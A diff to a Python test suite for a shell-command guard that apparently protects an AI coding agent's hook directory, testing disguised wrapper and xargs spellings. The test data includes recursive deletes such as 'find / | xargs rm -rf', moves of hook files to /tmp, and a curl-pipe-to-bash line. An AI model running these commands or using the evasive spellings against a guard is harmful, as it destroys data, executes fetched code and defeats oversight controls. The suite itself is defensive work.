@@ -705,7 +705,7 @@ class TestQuotedVerbTailIsUniform:
     #: no zone deny; it now reads the one home's quoted-directory arm, an
     #: ANSI-C quote and an escaped character (`_NATIVE_VERB_PATH`, not the
     #: anchor's whole prefix). The home-relative spellings are the unquoted
-    #: arm's, which that prefix lacks (DEF-3030).
+    #: arm's, which the anchor's prefix also reads since DEF-3030.
     _REMOVE_VERB_SHAPES = [
         "find {root} -exec {v} -rf {{}} +",
         "find {root} | xargs {v} -rf",
@@ -983,6 +983,263 @@ class TestBinaryVerbSpellingIsUniform:
         (tmp_path / "build").mkdir()
         assert_hook_allowed(_past_the_bump(shape.format(h=head.lower().removesuffix(".exe"), root="build"), tmp_path))
         assert_hook_allowed(_past_the_bump(shape.format(h=head, root="build"), tmp_path))
+
+
+class TestTheCommandPositionGrammarIsOneAcrossTheCarriers:
+    """C76's four rows as one class (principle 18): a word at a command
+    position is read the same way wherever one opens -- the anchor, the
+    carrier word after a pipe, the program behind a carrier.
+
+    * DEF-3012: the binary wrapper words case-blind with their `.exe`
+      (`_bash_patterns._CMD_POS_WRAPPER_SPELLED`), `command`, `exec` and
+      `time` as spelled.
+    * DEF-3030: a leading `~` or `~user` on the anchor's verb directory.
+    * DEF-3031: the xargs word itself at its command position, in the tail,
+      its witness and the PowerShell carrier.
+    * DEF-3032: the anchor's wrapper run (flags and values included) behind
+      find's exec action, the xargs carrier and a loop body
+      (`_CARRIER_WRAP_RUN`), and an assignment run in the loop body.
+
+    Each row is driven through the hook beside its bare control, and the
+    open-root twin is allowed as its bare twin is. Fixtures move the hooks
+    to a scratch directory, or write into one, as text handed to the guard.
+    """
+
+    _HOOK = " tools/cc/hooks/x.py"
+
+    @pytest.mark.parametrize("wrapper", [
+        "ENV", "NOHUP", "nohup.exe", "Sudo", "Timeout.EXE 5", "/usr/bin/ENV", "STDBUF -o0",
+    ])
+    @pytest.mark.parametrize("write", ["cp /tmp/x", "tee -a"])
+    def test_a_wrapper_in_another_case_or_with_its_suffix_walls_like_the_plain_word(
+            self, tmp_path, wrapper, write):
+        plain = wrapper.rsplit("/", 1)[-1].lower().replace(".exe", "")
+        _assert_zone_walled(f"{plain} {write}{self._HOOK}", tmp_path)
+        _assert_zone_walled(f"{wrapper} {write}{self._HOOK}", tmp_path)
+
+    @pytest.mark.parametrize("wrapper", ["ENV", "nohup.exe", "Sudo -u build"])
+    def test_a_spelled_wrapper_over_an_open_root_is_allowed(self, tmp_path, wrapper):
+        (tmp_path / "build").mkdir()
+        assert_hook_allowed(run_bash_guard(f"{wrapper} tee -a build/x.py", tmp_path))
+
+    def test_the_builtin_wrappers_keep_their_case_and_the_binaries_lose_it(self):
+        # bash matches a builtin and a keyword case-sensitively, so `COMMAND`
+        # is a command bash cannot run; every binary word runs in any case
+        # with its suffix under Git for Windows' bash (DEF-1161's host read)
+        bp = _bash_patterns_module()
+        rx = re.compile(bp._CMD_POS_WRAPPER_SPELLED + r"[ \t]")
+        builtins = _roster_words(bp._CMD_POS_WRAPPER_BUILTINS)
+        assert builtins == ["command", "time", "exec"], builtins
+        for word in builtins:
+            assert rx.fullmatch(word + " ") and not rx.fullmatch(word.upper() + " "), word
+        binaries = _roster_words(bp._CMD_POS_WRAPPER_BINARIES)
+        # both halves read from the module, so a word added to either half
+        # alone reds here (the second review's mutant M3 added to the
+        # builtins only and passed a pin that spelled the builtins itself)
+        assert sorted(binaries + builtins) == sorted(_roster_words(bp._CMD_POS_WRAPPER))
+        for word in binaries:
+            assert rx.fullmatch(word.upper() + ".EXE ") and rx.fullmatch(word.capitalize() + " "), word
+        assert bp._CMD_POS_WRAPPER_SPELLED in bp._CMD_POS_WRAP_RUN
+
+    @pytest.mark.parametrize("prefix", ["~/bin/", "~build/bin/", "~/.local/bin/"])
+    @pytest.mark.parametrize("write", ["tee -a", "cp /tmp/x", "chmod 600", "truncate -s0"])
+    def test_a_verb_behind_a_home_relative_directory_walls(self, tmp_path, prefix, write):
+        _assert_zone_walled(f"{write}{self._HOOK}", tmp_path)
+        _assert_zone_walled(f"{prefix}{write}{self._HOOK}", tmp_path)
+
+    @pytest.mark.parametrize("arm", sorted(k for k, v in TestQuotedVerbTailIsUniform._FIXTURES.items() if v))
+    def test_every_rostered_arm_reads_a_home_relative_verb(self, tmp_path, arm):
+        # the row's own measure: each zone-deny fixture of the quoted-verb
+        # roster respelled behind `~/bin/` (33 of 35 drew no deny before)
+        verb, bare = TestQuotedVerbTailIsUniform._FIXTURES[arm]
+        (tmp_path / "tools" / "cc" / "hooks").mkdir(parents=True, exist_ok=True)
+        _assert_zone_walled(bare, tmp_path)
+        _assert_zone_walled(_respelled(bare, verb, "~/bin/" + verb, inner=arm in _INNER_HEAD_ARMS), tmp_path)
+
+    @pytest.mark.parametrize("cmd", [
+        "echo ~/bin/tee -a tools/cc/hooks/x.py",     # an argument, not a command
+        "ls ~/bin/tee tools/cc/hooks/x.py",
+        'git commit -m "run ~/bin/tee -a on the log"',
+    ])
+    def test_a_home_relative_mention_stays_allowed(self, tmp_path, cmd):
+        assert_hook_allowed(run_bash_guard(cmd, tmp_path))
+
+    _CARRIER_WORDS = ['"xargs"', "'/usr/bin/xargs'", "/usr/bin/xargs", "\\xargs", "$'xargs'",
+                      "xargs.exe", "XARGS", "~/bin/xargs"]
+
+    @pytest.mark.parametrize("word", _CARRIER_WORDS)
+    def test_a_spelled_carrier_word_walls_like_the_bare_word(self, tmp_path, word):
+        _assert_zone_walled("find tools/cc/hooks | xargs mv -t /tmp/x", tmp_path)
+        _assert_zone_walled(f"find tools/cc/hooks | {word} mv -t /tmp/x", tmp_path)
+
+    @pytest.mark.parametrize("word", ['"xargs"', "/usr/bin/xargs", "XARGS"])
+    def test_a_spelled_carrier_word_over_an_open_root_is_allowed(self, tmp_path, word):
+        (tmp_path / "build").mkdir()
+        assert_hook_allowed(_past_the_bump("find build | xargs mv -t /tmp/x", tmp_path))
+        assert_hook_allowed(_past_the_bump(f"find build | {word} mv -t /tmp/x", tmp_path))
+
+    #: The run before the carrier word (`_CARRIER_LEAD_RUN`): an assignment
+    #: run, a wrapper behind its directory, busybox's applet, and bash's
+    #: `|&` (C76's failure-mode review, item 3).
+    _LEADS = ["| /usr/bin/env xargs ", "| LC_ALL=C xargs ", "| env LC_ALL=C xargs ", "|& xargs ",
+              "| busybox xargs ", "| ~/bin/nice xargs ",
+              # a builtin's name in another case reads case-blind here: no
+              # shell's case rule runs at a carrier, and on a case-blind
+              # volume `TIME` finds /usr/bin/time (main walled it)
+              "| TIME xargs ", "| xargs COMMAND ",
+              # xargs is a wrapper BEFORE the carrier: the inner one runs
+              # with the outer's operands (main walled it; the code review
+              # of 597abd35 found the shared step's xargs guard dropped it)
+              "| xargs xargs ", "| xargs -n 1 xargs ", "|& env xargs "]
+
+    @pytest.mark.parametrize("word", _CARRIER_WORDS + [
+        "sudo -u build xargs", "& 'C:/x/xargs.exe'", "& xargs", "&xargs",
+        # an unquoted 8.3 short name, `~` inside a segment: the PowerShell
+        # carrier read it and this gate hid it (the code review's W1)
+        "C:\\PROGRA~1\\Git\\usr\\bin\\xargs.exe",
+    ] + [lead[2:].strip() for lead in _LEADS if lead.startswith("| ")])
+    def test_the_witness_reads_every_word_the_tail_reads(self, word):
+        # a witness left narrow keeps the gate shut, and the readers never run
+        bp = _bash_patterns_module()
+        assert bp._PIPED_CARRIER_WITNESS_RE.search(f"find . | {word} mv -t /tmp/x"), word
+
+    @pytest.mark.parametrize("lead", _LEADS)
+    def test_the_witness_reads_every_lead_the_tail_reads(self, lead):
+        # `|&` then a lead: the witness took `|&` only before an empty lead,
+        # so `find / |& env xargs <wipe>` was read by the zone tier and
+        # hidden from the hard tier (the code review of 597abd35)
+        bp = _bash_patterns_module()
+        assert bp._PIPED_CARRIER_WITNESS_RE.search(f"find . {lead}mv -t /tmp/x"), lead
+
+    @pytest.mark.parametrize("lead", ["| xargs xargs ", "|& env xargs ", "| xargs -n 1 xargs "])
+    def test_the_hard_tier_reads_a_lead_before_the_carrier(self, lead):
+        bp = _bash_patterns_module()
+        assert bp.has_catastrophic_piped_remove(f"find / {lead}" + "r" + "m -" + "rf")
+
+    def test_the_powershell_hard_tier_reads_a_short_name_carrier(self):
+        bp = _bash_patterns_module()
+        verb = "r" + "m -" + "rf"
+        # an absolute root, which the rules judge with no start directory
+        assert bp.has_catastrophic_ps_sweep(f"find / | C:\\Git\\usr\\bin\\xargs.exe {verb}")
+        assert bp.has_catastrophic_ps_sweep(f"find / | C:\\PROGRA~1\\Git\\usr\\bin\\xargs.exe {verb}")
+
+    @pytest.mark.parametrize("word", ["xargs.exe", "/usr/bin/xargs", "& '/usr/bin/xargs'", "XARGS",
+                                      "& xargs", "&xargs", "& xargs.exe", "/usr/bin/env xargs"])
+    def test_a_spelled_carrier_word_walls_on_the_powershell_tool(self, tmp_path, word):
+        (tmp_path / "tools" / "cc" / "hooks").mkdir(parents=True, exist_ok=True)
+        _assert_zone_walled("find tools/cc/hooks | xargs rm -rf", tmp_path, _run_ps_guard)
+        _assert_zone_walled(f"find tools/cc/hooks | {word} rm -rf", tmp_path, _run_ps_guard)
+
+    @pytest.mark.parametrize("lead", _LEADS)
+    def test_a_lead_run_before_the_carrier_word_walls(self, tmp_path, lead):
+        _assert_zone_walled(f"find tools/cc/hooks {lead}mv -t /tmp/x", tmp_path)
+
+    @pytest.mark.parametrize("lead", _LEADS)
+    def test_a_lead_run_over_an_open_root_is_allowed(self, tmp_path, lead):
+        (tmp_path / "build").mkdir()
+        assert_hook_allowed(_past_the_bump(f"find build {lead}mv -t /tmp/x", tmp_path))
+
+    @pytest.mark.parametrize("value", ["script.txt", "env.list", "rm.list", "nice-list"])
+    def test_a_switch_value_opening_on_a_roster_word_keeps_the_move(self, tmp_path, value):
+        # the review's regression: a word boundary read `script.txt` as the
+        # wrapper `script` and the value as none, so the move went unread
+        # (and `rm.list` read as the remove verb, a delete)
+        command = f"find tools/cc/hooks | xargs -a {value} mv -t /tmp/x"
+        _assert_zone_walled(command, tmp_path)
+        reason = _guard_reason(_past_the_bump(command, tmp_path))
+        # the verb the reason opens with: every zone reason ends naming a
+        # move, so a bare "move" passed on a delete (the code review)
+        assert "Bash move of protected" in reason, reason
+        (tmp_path / "tools" / "cc" / "hooks").mkdir(parents=True, exist_ok=True)
+        _assert_zone_walled(f"find tools/cc/hooks | xargs -a {value} rm -rf", tmp_path, _run_ps_guard)
+
+    _WRAPPED_SHAPES = [
+        "find tools/cc/hooks -exec {w}mv -t /tmp/x {{}} +",
+        "find tools/cc/hooks | xargs {w}mv -t /tmp/x",
+        'for f in $(find tools/cc/hooks); do {w}mv "$f" /tmp/x; done',
+        'find tools/cc/hooks | while read f; do {w}mv "$f" /tmp/x; done',
+    ]
+    _WRAPPED_IDS = ["exec", "xargs", "for-body", "read-body"]
+
+    @pytest.mark.parametrize("wrapper", [
+        "nice -n 19 ", "sudo -u build ", "timeout 60 ", "env -i ", "stdbuf -o0 ",
+        "busybox ", "doas ", "ENV ", "nice -n 5 nohup ",
+        # a wrapper behind its directory, and an assignment run behind a
+        # wrapper, as the anchor reads both (the review's item 3, W2)
+        "/usr/bin/env ", "/usr/bin/nice -n 19 ", "/bin/busybox ", "~/bin/env ",
+        "env LC_ALL=C ", "sudo A=1 B='x y' ", "/usr/bin/env LC_ALL=C ",
+    ])
+    @pytest.mark.parametrize("shape", _WRAPPED_SHAPES, ids=_WRAPPED_IDS)
+    def test_a_wrapper_with_its_flags_behind_a_carrier_walls(self, tmp_path, shape, wrapper):
+        _assert_zone_walled(shape.format(w=""), tmp_path)
+        _assert_zone_walled(shape.format(w=wrapper), tmp_path)
+
+    @pytest.mark.parametrize("prefix", ["LC_ALL=C ", "A=1 B='x y' ", "LC_ALL=C nice -n 19 "])
+    @pytest.mark.parametrize("shape", _WRAPPED_SHAPES[2:], ids=_WRAPPED_IDS[2:])
+    def test_an_assignment_prefix_in_a_loop_body_walls(self, tmp_path, shape, prefix):
+        _assert_zone_walled(shape.format(w=prefix), tmp_path)
+
+    @pytest.mark.parametrize("second", ['mv /tmp/a /tmp/b', 'rm -f /tmp/log'])
+    @pytest.mark.parametrize("shape", [
+        'for f in $(find tools/cc/hooks); do LC_ALL=C mv "$f" /tmp/x; {s}; done',
+        'find tools/cc/hooks | while read f; do LC_ALL=C mv "$f" /tmp/x; {s}; done',
+    ], ids=["for-body", "read-body"])
+    def test_an_assigned_remove_is_never_skipped_as_a_statement(self, tmp_path, shape, second):
+        # the body's skip-a-statement run must not eat the assigned remove,
+        # or the root drops and only the later statement's operands are read
+        # (the code review's N1: the lookahead survived its revert)
+        _assert_zone_walled(shape.format(s=second), tmp_path)
+
+    @pytest.mark.parametrize("wrapper", ["nice -n 19 ", "sudo -u build ", "/usr/bin/env ", "env LC_ALL=C "])
+    @pytest.mark.parametrize("shape", _WRAPPED_SHAPES, ids=_WRAPPED_IDS)
+    def test_a_wrapped_carrier_over_an_open_root_is_allowed(self, tmp_path, shape, wrapper):
+        (tmp_path / "build").mkdir()
+        open_root = shape.replace("tools/cc/hooks", "build")
+        assert_hook_allowed(_past_the_bump(open_root.format(w=""), tmp_path))
+        assert_hook_allowed(_past_the_bump(open_root.format(w=wrapper), tmp_path))
+
+    @pytest.mark.parametrize("wrapper", ["sudo -u build ", "timeout 60 ", "nice -n 19 ",
+                                         "/usr/bin/env ", "env LC_ALL=C ",
+                                         "C:\\Git\\usr\\bin\\env.exe ", "/a/env -i /a/env "])
+    def test_a_wrapper_with_its_flags_behind_the_carrier_walls_on_the_powershell_tool(self, tmp_path, wrapper):
+        (tmp_path / "tools" / "cc" / "hooks").mkdir(parents=True, exist_ok=True)
+        _assert_zone_walled(f"find tools/cc/hooks | xargs {wrapper}rm -rf", tmp_path, _run_ps_guard)
+
+    def test_the_carriers_read_one_wrapper_run(self):
+        # one home: an edit to the anchor's run reaches every carrier, and a
+        # carrier that spells its own list again reds here
+        bp = _bash_patterns_module()
+        # the carrier's one wrapper is the anchor's run with its flag
+        # lookahead widened to a wrapper behind its directory, and nothing
+        # else (spelled out for the ReDoS gate's static reconstruction)
+        widened = bp._CMD_POS_WRAP_RUN.replace(
+            "(?!" + bp._CMD_POS_WRAPPER_SPELLED + r"[ \t])",
+            "(?!(?:" + bp._CARRIER_WRAP_DIR + ")?" + bp._CARRIER_WRAP_WORD + r"[ \t])", 1)
+        assert widened != bp._CMD_POS_WRAP_RUN
+        assert bp._CARRIER_WRAP_ONE == widened
+        # the carriers' assignment is the anchor's with its quoted arms
+        # stopped at a newline (an operand span never crosses a statement)
+        one_line = (bp._CMD_POS_ENV_ASSIGN.replace(r"[^'\\]", r"[^'\\\n]")
+                    .replace(r"'[^']*'", r"'[^'\n]*'").replace(r'[^"\\]', r'[^"\\\n]'))
+        assert one_line != bp._CMD_POS_ENV_ASSIGN
+        assert bp._CARRIER_ENV_ASSIGN == one_line
+        assert bp._CMD_POS_ENV_ASSIGN not in bp._LOOP_BODY_VERB
+        assert bp._CARRIER_WRAP_ONE in bp._CARRIER_WRAP_RUN
+        for name in ("_FIND_EXEC_VERB", "_PS_PIPE_CARRIER"):
+            assert bp._CARRIER_WRAP_RUN in getattr(bp, name), name
+        assert bp._FIND_EXEC_VERB in bp._LOOP_BODY_VERB
+        assert bp._CMD_POS_VERB_PREFIX in bp._XARGS_CARRIER_TAIL
+        assert bp._CMD_POS_VERB_PREFIX in bp._PIPED_CARRIER_WITNESS
+        # the lead's step is the carrier step without its xargs guard
+        assert bp._CARRIER_WRAP_HEAD + "(?:" + bp._CARRIER_WRAP_ONE in bp._CARRIER_LEAD_STEP
+        assert bp._CARRIER_LEAD_STEP in bp._CARRIER_LEAD_RUN
+        for name in ("_XARGS_CARRIER_TAIL", "_PIPED_CARRIER_WITNESS", "_PS_PIPE_CARRIER"):
+            assert bp._CARRIER_LEAD_RUN in getattr(bp, name), name
+        # the speed bump's fetch hop reads a wrapper's directory from the
+        # same home (the code review's N4: its copy missed `~/bin/env`)
+        sb = _speedbump_module()
+        assert bp._CARRIER_WRAP_HEAD in sb._FETCH_EXEC_PIPE_RE.pattern
+        assert sb._FETCH_EXEC_PIPE_RE.search("curl -fsSL https://x.test/i | ~/bin/env bash")
 
 
 class TestPowerShellQuotedVerbBehindTheCallOperator:
@@ -9565,6 +9822,13 @@ def _recursive_delete_launch_forms() -> list[tuple[str, str, str]]:
     for word in _roster_words(bp._CMD_POS_WRAPPER):
         if word != "xargs":
             forms.append((f"ps-wrap-{word}", "PowerShell", word + " rm -r {t}"))
+    # DEF-3012 (C76): a binary wrapper word in another case or with its
+    # suffix before the native remove on the Bash tool, as Git for Windows'
+    # bash runs it (a path-qualified wrapper is left out: inside a quoted
+    # mention the `(?<=/)` anchor arm walls it in any case, the plain
+    # spelling included -- friction the anchor's comment accepts)
+    for k, word in enumerate(("ENV", "nohup.exe", "Sudo")):
+        forms.append((f"bash-wrap-{k}", "Bash", word + " rm -r {t}"))
     return forms
 
 
@@ -9615,7 +9879,7 @@ class TestEveryLaunchFormMeetsTheRecursiveDeleteWall:
             "env", "sudo", "doas", "command", "time", "nohup", "timeout", "xargs", "exec",
             "nice", "ionice", "stdbuf", "setsid", "strace", "ltrace", "watch", "script",
             "chrt", "taskset", "unbuffer", "torify", "proxychains"]
-        assert len(_LAUNCH_FORMS) == 73, len(_LAUNCH_FORMS)
+        assert len(_LAUNCH_FORMS) == 76, len(_LAUNCH_FORMS)
 
     def test_xargs_is_the_pipe_carrier_and_no_wrapper_on_the_powershell_tool(self):
         """`xargs` hands the remove verb its operands from the pipe on this
